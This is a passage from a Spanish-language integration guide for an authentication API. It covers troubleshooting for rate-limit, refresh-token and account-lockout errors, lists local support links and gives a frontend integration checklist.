### 3. Error 429 (Too Many Requests)

**Síntoma:**
```json
{
  "error": "Too Many Requests",
  "message": "Rate limit exceeded"
}
```

**Solución:**
- Esperar 30 minutos
- O reiniciar contenedor Redis (borra límites):
```bash
docker-compose restart redis
```

---

### 4. Refresh Token Inválido

**Síntoma:**
```json
{
  "error": "Unauthorized",
  "message": "Invalid or expired refresh token"
}
```

**Causas:**
1. Token expiró (7 días)
2. Token ya fue usado (rotación)
3. Usuario hizo logout

**Solución:**
- Redirigir a login
- Limpiar tokens de storage

---

### 5. Usuario Bloqueado

**Síntoma:**
```json
{
  "status": 403,
  "message": "Account is locked due to multiple failed attempts"
}
```

**Solución:**
- Esperar 30 minutos
- O resetear intentos en base de datos:
```sql
UPDATE users SET failed_attempts = 0 WHERE email = 'admin@test.com';
```

---

## 📞 Soporte

Para preguntas o problemas:

1. **Documentación Swagger**: http://localhost:8080/swagger-ui/index.html
2. **Health Check**: http://localhost:8080/actuator/health
3. **Repositorio Backend**: https://github.com/kevinbayter/wom-auth-service-api

---

## 📝 Checklist de Integración

Usa este checklist para verificar que tu frontend esté correctamente integrado:

- [ ] Consumo exitoso de `/auth/login`
- [ ] Tokens guardados correctamente (preferiblemente en Cookies HttpOnly)
- [ ] Header `Authorization: Bearer <token>` en peticiones protegidas
- [ ] Interceptor HTTP implementado
- [ ] Refresh automático de tokens funcionando
- [ ] AuthGuard protegiendo rutas
- [ ] Manejo de errores 401, 403, 429
- [ ] Logout limpia tokens y redirige a login
- [ ] CORS configurado correctamente
- [ ] Perfil de usuario (`/auth/me`) se obtiene correctamente

---

<div align="center">

**Desarrollado con ❤️ para WOM**

[📚 Swagger UI](http://localhost:8080/swagger-ui/index.html) • 
[🔍 OpenAPI Spec](http://localhost:8080/v3/api-docs) • 
[❤️ Health Check](http://localhost:8080/actuator/health)

</div>
